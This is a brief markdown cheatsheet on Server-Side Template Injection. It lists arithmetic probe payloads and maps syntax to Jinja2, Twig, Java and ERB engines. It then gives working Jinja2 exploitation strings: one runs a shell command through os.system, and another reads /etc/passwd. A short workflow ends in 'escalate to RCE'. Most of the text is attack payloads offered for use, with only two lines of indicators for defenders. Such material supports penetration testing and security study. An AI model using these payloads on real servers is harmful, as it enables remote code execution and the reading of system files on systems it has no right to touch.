# ⚙️ SSTI Cheatsheet

> Practical detection and exploitation of Server-Side Template Injection

---

## 🎯 Detection Payloads

```plaintext
{{7*7}}
${7*7}
<%= 7*7 %>
```

👉 If output = 49 → SSTI confirmed

---

## 🔍 Identify Engine

* `{{ }}` → Jinja2 / Twig
* `${}` → Java
* `<%= %>` → ERB

---

## 💣 Exploitation

### Python (Jinja2)

```plaintext
{{config.__class__.__init__.__globals__['os'].system('id')}}
```

---

### File Read

```plaintext
{{self.__init__.__globals__.__builtins__.open('/etc/passwd').read()}}
```

---

## 🧠 Workflow

1. Inject math payload
2. Confirm execution
3. Identify engine
4. Escalate to RCE

---

## 🚨 Indicators

* Input evaluated as code
* Output reflects execution result
